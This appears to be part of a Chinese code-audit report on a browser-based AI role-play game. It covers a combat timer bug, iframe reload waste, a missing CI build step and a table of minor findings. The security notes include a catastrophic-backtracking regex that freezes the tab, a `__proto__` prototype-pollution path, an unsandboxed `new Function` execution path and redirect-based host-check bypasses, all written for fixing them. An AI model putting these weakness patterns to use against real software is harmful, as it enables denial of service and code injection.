**COR-13（`combat-v3/phases/round.ts:215`）** —— 「召唤时限」（category `增益`、timeUnit `回合`）每轮被减两次：`handleRoundOpen` 的通用增益 tick（`round.ts:68` → `applyBuffTick`，没有排除它）一次，`handleRoundClose` 的 `expireSummonedUnits`（`round.ts:100`）一次。而**只有 round.close 那条**会发 `UnitDespawned`/`removeUnitIds`；round.open 那条只是把状态删掉。召唤发生在轮中，首次 tick 落在 close，于是**偶数时长的召唤会在 round.open 归零 → 永不消失**（单位留在战斗里，计时器被静默删除），奇数且 ≥3 的在大约一半寿命时消失，时长 1 不受影响。现有测试（`spawn.test.ts:210`）直接连调两次 `handleRoundClose`、从不跑 `handleRoundOpen`，所以看不见。
**建议：** 在 `applyBuffTick` 里跳过这个保留名（`if (buff.name === '召唤时限') continue;`），或给召唤时长 buff 一个 `applyBuffTick` 不匹配的专属类别，让 `expireSummonedUnits` 成为唯一所有者。

---

## PERF-01（2026-08-01 登记，复发确认）—— 灾难性回溯在宿主主线程上无预算运行

**严重度：中** · **区域：`src/sillytavern/beautifier.ts:489`** · **已修正**

`findEligibleMatches` 只给「重叠重试」分支记账（`overlapScan > MAX_OVERLAP_SCAN_CHARS_PER_RULE`），而真正要命的开销在**单次 `exec()` 内部**：嵌套量词让那一次调用永不返回，字符预算根本轮不到被查。`compileBeautifierSegments` 的 `try/catch` 能接异常，接不了不终止；而它是在 Vue `computed` 里同步跑在渲染线程上（`BeautifiedNarrative.vue:105`）。全链路无输入长度上限、无超时。

一条看起来极普通的工坊正则 `/^(\s*\w+)+\./gm` 遇上一行没有句号的三十词叙事，标签页就永久冻结 —— 无报错、无 toast、无恢复，进行中回合的状态随强制关闭一起丢失。

**政策判定：无限期搁置**（2026-08-09 维护者裁定）。 逐条核三条红线：卡死的是渲染线程，够不到应用之外的文件（①）、跑不出浏览器沙箱（②）、也读不到任何 Key（③ —— 它连脚本都没执行，只是正则引擎不返回）。损失是「进行中回合的状态随强制关闭丢失」，正好落在明确容忍的「搞坏存档」那一类。**降为容忍项。**

值得留一句知情：这条不需要恶意规则，**可信作者手滑写出嵌套量词就会中**（`/^(\s*\w+)+\./gm` 这种看着极普通）。若哪天用户反馈「打字打到一半整个页面卡死」，这里是第一嫌疑人。

**若将来要修（备查）：** 按规则限制总工作量而不只是重试分支 —— 给单条规则的输入长度设上限，和/或把规则求值挪出渲染线程（Worker）并加墙钟 kill，让病态规则降级成「此规则已跳过」。便宜的第一步是在 `mapWorkshopRegexes` 里加一个嵌套量词的静态筛查，命中即以 `dropped` 备注丢弃。

---

## PERF-02 —— 每回合首尾把聊天记录里所有美化 iframe 各重载一遍

**严重度：中** · **区域：`src/ui/components/game/BeautifierFrame.vue:157`** · **已确认**

watcher 同时盯 `props.markup` 与 `props.forwardContextMenu`，任一变化就换新 `bridgeId` —— 而 `bridgeId` 参与 `srcdoc`（`:49`）计算，于是整个 iframe 文档重载，同时 `height` 被重置到最小值。

`forwardContextMenu` 逐条消息绑到 `canOpenMenu(msg)`（`ChatFlow.vue:349`），而 `canOpenMenu` 上来就是 `if (game.isInCombat || props.isGenerating) return false;`（`ChatFlow.vue:183`）。所以 `isGenerating` 一翻转，**所有**助手消息的这个 prop 同时变化。

40 条含富美化命中的消息 → 发消息时 40 个 iframe 重载（各自塌到最小高度再重测，整个聊天记录肉眼可见地跳动，规则脚本重跑、远程资源重取），生成结束再重载 40 个。**每回合 80 次文档重建，渲染结果一个字节都没变。** ChatFlow 没有虚拟化，所以是全量。

**建议：** 只在 `markup` 变化时重建文档；`forwardContextMenu` 通过已有的 postMessage 桥推给活着的 frame，不要重生成 `bridgeId`/`srcdoc`。或者干脆不要把生成状态编进这个 prop —— 在 contextmenu 触发时判断，而不是在渲染时判断。

---

## TEST-01 —— CI 从不构建应用

**严重度：中** · **区域：`.github/workflows/ci.yml`** · **未复核**

三个 job 跑的是 types（typecheck / typecheck:vue / typecheck:tools）、quality（format:check / lint / knip:ratchet）、test（test:run）。**没有任何一步调 `npm run build`。** 文件头注释按名字列举了「八道闸门」，build 不在其中 —— 是遗漏而非刻意排除。

`tsc` / `vue-tsc` 不解析资源导入与 CSS `url()`，所以「删掉一个主题文件后仍被 import」「`new URL('./x.wasm', import.meta.url)` 指向不存在的文件」「vite 插件在构建期抛错」这类破坏可以全绿合入。本次审查手工跑了 `npx vite build`，当前是通过的（21.6s）—— 但这只说明此刻没坏。

这也与上一份 review 的 REL-01（生产构建不是完整可运行产物）同源。

**建议：** 给 types job 加一行 `- run: npm run build`（它约 48s，是三个 job 里最短的，加上去不会改变墙钟关键路径 —— 关键路径仍是 test 的约 82s）。

---

## 复核确认「确实做得好」的部分

这一节不是客套 —— 下面每一条都是复核 Agent 试图找茬而没找到的：

- **持久化的事务纪律。** `restoreSnapshot`（`state-manager.ts:1409`）把它触碰的每张表包进同一个 Dexie 事务；`deleteSaveSlot`（`database.ts:1444`）级联删除同样事务化；`importAllData` 有前置备份 + 回滚，并且按表区分 `undefined` / `[]` / 有行三种语义，**刻意拒绝**删除旧备份没有表态的表。本次没有找到任何会丢数据的 Dexie 升级函数。
- **localStorage → Dexie 的迁移骨架**（`legacy-dexie-migration.ts`）是防御性正确的：先去重再写、销毁源之前先回读校验、完成标志最后置位。
- **QuickJS 隔离本身。** realm 分离、每一处执行客体代码的求值（含 vars 快照与回读窗口）都武装了 interrupt 截止、handle 释放、drain job 上限、纯 JSON 编组 —— 没找到沙箱逃逸，也没找到每回合的 handle 泄漏。本次 EJS 侧的缺陷全在**数据保真**而非隔离。
- **`story-output` 的健壮性。** 截断、嵌套、未闭合的 `<option(s)>` / `<maintext>` 各种畸形输入都能扛住。`agent-xml` 把四份分叉的 `extractTag` 收敛成一套命名约定，编排层的三层失败回执（解析/构建/提交）是对旧「全吞」catch 的实质改进。
- **图像生成的四条「花钱铁则」全部经得起阅读。** 限额确实跑在付费侧链之前（`scene-image-store.admitAndEnqueue` 第一步，且准入是串行化的）；自动档确实不回溯扫历史（只由编排器一次性的 `onSceneImage` 触发）；超限确实降级成 `offer` 按钮而不是丢标记；两个手动入口都走 `useManualSceneImage`，把 `ok:false` 变成二次确认而不是死路。
- **组件的清理纪律**优于同规模项目的常态：本次打开的每一个监听器 / 定时器 / observer / IntersectionObserver 都有配对的拆除；模型输出从不经 `v-html`，走的是 `escapeHtml`（ChatFlow）或不透明 iframe。
- **不变量闸门是带反假绿哨兵写的**（encoding-invariants 的「到底扫到东西没有」、knip-ratchet 的按身份比对、ejs 语料门的双向白名单、combat-v3 的 no-nondeterminism）。这一层用心程度多数仓库直接跳过。
- **战斗 v3 的确定性本身是成立的** —— 内核里没有 `Math.random` / `Date.now` / `eval`，表达式解释器是纯递归 AST 求值且深度有界，replay 哈希对对象键排序，`applyPending`/`applyOutcome` 确实返回新状态而不改输入。本次战斗侧的问题全是**中断/恢复路径上的账目丢失**，不是不确定性。
- **内容-引擎分离在「不外泄」这一轴上是干净的**（补正后专门核过）。`public/data/` 是显式标注的占位集，真实内容只走 `POEM_CONTENT_DIR` 的 dev overlay，而 overlay 只注册在 `configureServer`；`vite build` 产出的 `dist-ui/data/` 里是占位集。分发构建产物不会连带分发内容 —— 这正是分离想达到的效果，而它真的达到了。`__POEM_CONTENT_DIR__` 走**编译期布尔**而不是运行时 HTTP 探测（`vite.config.ts:19-26` 就地写明了为什么不能探测），也是同一个考虑下的正确选择。

---

## 登记但未展开（低优先级 / 未复核）

以下条目证据完整但影响有限，或仅经单 Agent 提出未做对抗复核，此处仅登记以免遗失。

| ID      | 位置                                           | 一句话                                                                                                                                                                                                                                                                                                                                             | 置信度     |
| ------- | ---------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------- |
| SEC-07  | `server/routes/proxy.ts:82`                    | 主机名校验只跑在用户给的 base URL 上，`fetch` 默认跟随 302；另 `api-key` 自定义头在跨源重定向时不被 undici 剥离                                                                                                                                                                                                                                    | 已修正     |
| SEC-08  | `ejs-quickjs-backend.ts:827`                   | `Object.assign(ctx.vars, parsed)` 触发继承的 `__proto__` 访问器，客体可设宿主草稿原型（不落库，但污染本趟）。**补正后不再按安全问题看** —— 可信作者写不出这种形状，剩下的是健壮性：与同子系统其它路径（均显式筛 `DANGEROUS_PATH_SEGMENTS`）不一致                                                                                                  | 未复核     |
| COR-09  | `ejs-quickjs-backend.ts:819`                   | 草稿里出现让 `JSON.stringify` **抛错**的值时整趟 vars 写入丢弃，且无 `ok:false`、无 warn，与 Legacy 分叉                                                                                                                                                                                                                                           | 已修正     |
| COR-10  | `combat-v3/reducer.ts:275`                     | `resumeBlock` 丢弃 `frame.pendingChanges`，攻击槽与 MP/SP 消耗静默丢失（当前被 `UnsupportedInM2` 挡住）                                                                                                                                                                                                                                            | 已修正     |
| COR-11  | `combat-v3/windows.ts:129`                     | 无人递减 `charges.remaining`，`consumedCharge` 返回值零消费；但「不死」另有其因（`attack.ts:531` 对 `death.threshold` 无次数要求）                                                                                                                                                                                                                 | 已修正     |
| COR-14  | `combat-v3/reducer.ts:696`                     | 冻结帧把 `diceConsumedInFrame` 全填 0 且丢掉 `biz.dice`，下次攻击重掷同样点数                                                                                                                                                                                                                                                                      | 已确认     |
| COR-15  | `agent-orchestrator.ts:1014`（另 `:860`）      | 两处阶段 `<json>` 用手写正则 + 裸 `JSON.parse`，不走 `model-json` 的抢救链；一个代码围栏丢掉该阶段整批补丁                                                                                                                                                                                                                                         | 已修正     |
| COR-16  | `preset-loader.ts:150`（另 `:241`、`:325`）    | 三份手维护的白名单漏了 `SKILL_STATE` / `QUEST_STATE` / `IMAGE_REQUEST`；当前无出货内容命中，属潜伏                                                                                                                                                                                                                                                 | 已修正     |
| COR-17  | `agent-client.ts:558`                          | 首字节后 `clearTimeout` 且不再武装，中途停流会永久挂起；有「停止生成」按钮可人工恢复，缺的是自动空闲超时                                                                                                                                                                                                                                           | 已修正     |
| COR-18  | `game-store.ts:477`                            | `patchSaveMetadata` 整行写回内存快照；实践中多数写者随后即 `refreshFromDb`，残留窗口是手动开关世界书与 `advanceTurn` 交错                                                                                                                                                                                                                          | 已修正     |
| COR-19  | `subscription-manager.ts:253`                  | 嵌套 `$event.on` 注册到 `${owner}:subscription:nested`，`unregisterAll(ownerKey)` 永远够不到；同角色多物品还会互相顶替                                                                                                                                                                                                                             | 已修正     |
| COR-20  | `workshop-social-store.ts:642`                 | 登出后落地的 toggle 会把覆盖层写回；仅内存、单项目、下次登出/登入/刷新即清                                                                                                                                                                                                                                                                         | 已修正     |
| COR-21  | `create-store.ts:2009`                         | `CreatePreset` 无工坊字段，且 `applyPresetData` 用条件赋值，残留上一次的核心/角色选择                                                                                                                                                                                                                                                              | 未复核     |
| COR-22  | `agent-settings.ts:326`                        | `updateAgentWorldBookIds` 把解析后的完整名册写回覆盖层，内容包默认从此被冻结                                                                                                                                                                                                                                                                       | 未复核     |
| COR-23  | `image-preset-store.ts:194`                    | 改名时 `remove(source.key)` 的结果被丢弃，删除失败仍报成功，留下两条同角色预设                                                                                                                                                                                                                                                                     | 未复核     |
| COR-24  | `BeautifierFrame.vue:179`                      | storage session 在 `onMounted` 定档；`block → allow` 方向会静默丢弃全部 storage 写入（`allow → block` 方向不泄漏，文档已硬零化）                                                                                                                                                                                                                   | 已修正     |
| COR-25  | `GamePage.vue:51`                              | 异步 `onMounted` 无存活检查；`openingPromptConsumed` 保证不重复扣费，代价是一次用户已离开的 API 调用                                                                                                                                                                                                                                               | 已修正     |
| COR-26  | `HomePage.vue:213`                             | 20 颗装饰星在 `:style` 里直接 `Math.random()`，`:key="i"` 稳定 → 每次重渲染（每 5 秒换格言）整片闪烁                                                                                                                                                                                                                                               | 未复核     |
| COR-27  | `state-manager.ts:241`                         | 逐条应用无事务；但「部分成功」是**刻意的、有测试钉住的**语义，真正的缺陷是文件头注释仍写「全部成功或全部回滚」                                                                                                                                                                                                                                     | 已修正     |
| COR-28  | `ejs-capabilities.ts:536`                      | `NOTIFY_PER_PASS` / `LOG_PER_PASS` 命名与注释说 per-pass，实际 per-entry（per-entry 才是对的）；真实缺口是**没有** pass 级上限，N 个动态条目可弹 3N 个 toast                                                                                                                                                                                       | 已修正     |
| COR-29  | `vite.config.ts:102`（另 `:144`）              | 写入中间件无字节上限、无 `error`/`aborted` 监听，断连时响应永不结束                                                                                                                                                                                                                                                                                | 未复核     |
| PERF-03 | `MapPanel.vue:333`                             | 每次地图源加载完成都 `addHandler('animation', …)` 且无 `removeHandler`，来回切源即叠加                                                                                                                                                                                                                                                             | 未复核     |
| PERF-04 | `useMapViewer.ts:214`                          | 同一 key 重复加载时不 `revokeObjectURL` 旧值，约 12 MB 的地图 blob 每次往返泄漏一份                                                                                                                                                                                                                                                                | 未复核     |
| TEST-02 | `subscription-manager.test.ts:87`              | S4「递归超限被切断」**零断言**且注释自陈没触发递归；但 `setMaxDepth` 有冒烟、`setEffectSink` 在 `effect-wiring.test.ts` 有端到端覆盖 —— 原报的「完全无覆盖」不成立                                                                                                                                                                                 | 已修正     |
| TEST-03 | `MiniPlayer.test.ts:59`                        | 12 次 `mount` 只有 1 次 `unmount`，也没有 `enableAutoUnmount(afterEach)`（同目录另四个文件都有），泄漏的 wrapper 冲模块级音频单例                                                                                                                                                                                                                  | 未复核     |
| TEST-04 | `agent-orchestrator.test.ts:1487`              | 名为「同一 patches batch」的用例用 `flatMap` 跨全部 commit 调用取并集，拆批后仍然通过                                                                                                                                                                                                                                                              | 未复核     |
| TEST-05 | `tests/agent-tools-prompt-contract.test.ts:42` | 用例生成以提示词里是否含「可用工具」四字为门；改写小标题即静默少生成用例（13 个 agent 目前只覆盖到 3 个）                                                                                                                                                                                                                                          | 未复核     |
| TEST-06 | `scripts/nai-regression-smoke.ts`              | 不在任何 tsconfig 的 include 里，却 import 五个生产符号；重构后仍然全绿，脚本自己坏掉                                                                                                                                                                                                                                                              | 未复核     |
| DOC-01  | `src/sillytavern/AGENTS.md`                    | 「agent-config.json 现有 47 个 U+FFFD」与「文件在 `data/defaults/`」两处均已失实（实测 U+FFFD 为 0；真实路径是 `public/data/defaults/`），而根 AGENTS.md 指定这份分册为必读                                                                                                                                                                        | 未复核     |
| COR-30  | `effect-runtime.ts:309`                        | `evaluateCondition` 把 `effect.condition` 拼进 `new Function` 且**零全局遮蔽**（只有 `vars` / `chars` 两个形参，连 SEC-02 那份 `SANDBOX_SHADOW_GLOBALS` 都没有）。生产无实例（`EffectRuntime` 只被自身测试引用），属死代码 —— 但它是一把上了膛的枪：谁把它接线，就直接开出第二条同源代码执行路径（红线 ③）。建议直接删除，或在接线前先换成 QuickJS | 主会话亲验 |
| DOC-02  | `story-output.ts:21`                           | `<sum>` / `<vars>` 在 story 提示词里是强制输出通道，但全仓没有任何解析器，`stripControlSection` 只是把它们删掉                                                                                                                                                                                                                                     | 未复核     |

---

## 建议修复顺序

> 顺序已按 2026-08-09 的两次前提补正（内容可信 + 三条红线）重排。**越线的先修，容忍的不修。**

**发行阻塞 —— 只有两条**

1. **SEC-02** —— 唯一活着的红线 ③（且是唯一活着的同源代码执行路径）。把 `executeScript` 挪出应用同源上下文（走 `ejs-quickjs-backend` 已在用的 QuickJS 隔离）并加墙钟/指令预算。改完之前的最低限度：把 `script-executor.ts` 里那句「当前生产链路尚未接通脚本执行」的**过期注释**删掉 —— 它现在会让读者以为这条路是死的。
   便宜的纵深防御（可以先上）：给应用文档加 `connect-src` CSP，单独打断「上传」那条腿。所有模型流量本来就走同源 BFF，代价应该很小 —— 但要先实测确认工坊 worker 那个源。
2. **BLK-01** —— 当前唯一让游戏玩不下去的问题，一行的顺序调整。它同时把 COR-10~COR-14 从「跑不到」变成「真的会发生」，所以修完要立刻处理 COR-12 与 COR-13。

**发行前需要裁定（不是代码问题，是方案问题）**

3. **SEC-09 + SEC-04** —— 取决于发行版带不带本地 BFF。`forward()` 的 `#` 截断不论如何都该修（成本低、零兼容性代价）；CORS 白名单则视发行形态决定是否必要。

**第二梯队 —— 功能与正确性**

4. **COR-02 / COR-01 / COR-07** —— 「快照读-改-写」这一族里波及面最大的三条。
5. **COR-03 / COR-04 / COR-06** —— 三条静默失效的玩法级功能（小时制 buff、`$status` 意图、地图标记）。
6. **TEST-01** —— 补 build 闸门，成本一行。
7. 其余按上表严重度推进；`未复核` 的条目建议先各自复核再动手。

**维护者工作站卫生（不阻塞发行，但那台机器上放着私有内容仓）**

8. **SEC-03 + SEC-05** —— `/data` 补规范化包含校验、写入口加同源校验。两条同属 dev server，一并处理成本最低。

**无限期搁置（2026-08-09 维护者裁定 —— 不设复查日期，不进任何 backlog）**

**SEC-06、PERF-01、SEC-07、SEC-08 —— 造不成真实损害，正式搁置。** 四条逐一对过三条红线：都关在浏览器沙箱内或只损己，够不到应用之外的文件、够不到宿主、够不到 Dexie 与 API Key。它们属于为最大兼容性刻意买单的那部分暴露面，不是待办事项。

唯一附带的建议是**一句注释**（不是修复）：把「`origin` 两档信任在有捕获组时基本是装饰性的」写进 `src/ui/AGENTS.md` 或 `beautifier-frame.ts`，免得后来者误以为 `block` 档真的挡住了模型字节，进而在这个错误前提上做新决策。

⚠️ 搁置的前提是**三条红线本身不变**。这四条全都是「因为够不到某样东西」才无害的，那样东西一变，结论就得重来。触发重评的具体条件：

- 发行形态换成桌面壳（Electron / Tauri / WebView）—— 宿主能力面与浏览器不同，「关在浏览器沙箱内」这个前提直接失效；
- 美化 iframe 被加上 `allow-same-origin`（哪怕只为某个兼容性需求开一次）—— SEC-06 当场从搁置变红线 ③；
- API Key 从应用同源的 Dexie 挪到别处，或引入任何新的密钥/凭据存储；
- 给应用加了 CSP 又留了宽松的 `connect-src` —— 那会造成「已加固」的错觉，但 SEC-06 的出网腿依然在。
